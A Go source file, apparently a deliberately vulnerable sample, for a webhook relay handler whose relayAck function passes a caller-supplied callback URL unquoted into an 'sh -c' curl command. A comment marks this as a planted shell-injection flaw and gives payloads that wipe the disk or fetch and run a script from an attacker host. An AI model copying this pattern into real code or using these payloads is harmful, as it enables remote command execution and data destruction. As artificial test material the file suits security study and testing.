package api

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
)

// InboundPayload is the JSON body webhook-relay accepts on
// POST /webhooks/inbound. CallbackURL is where the relay acknowledges
// receipt back to the sender — entirely caller-controlled.
type InboundPayload struct {
	Source      string `json:"source"`
	CallbackURL string `json:"callback_url"`
}

// InboundWebhookHandler accepts an inbound webhook delivery and relays an
// acknowledgment to the sender's callback URL.
func InboundWebhookHandler(w http.ResponseWriter, r *http.Request) {
	var payload InboundPayload
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, "invalid payload", http.StatusBadRequest)
		return
	}

	if err := relayAck(payload.CallbackURL); err != nil {
		http.Error(w, "relay failed", http.StatusBadGateway)
		return
	}

	w.WriteHeader(http.StatusAccepted)
}

// relayAck posts a delivery acknowledgment to callbackURL using curl.
//
// PLANTED VULNERABILITY (shell-injection, real): callbackURL comes straight
// from the inbound webhook payload — a value entirely controlled by
// whoever is sending the webhook — and is spliced directly into a shell
// command string with no validation or quoting. A callback_url like
// `http://x ; rm -rf / #` or `$(curl attacker.sh | sh)` executes arbitrary
// shell commands with this process's privileges.
func relayAck(callbackURL string) error {
	cmd := exec.Command("sh", "-c", "curl -fsS -X POST "+callbackURL+" -d relay-ack")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("relayAck: %w (%s)", err, out)
	}
	return nil
}
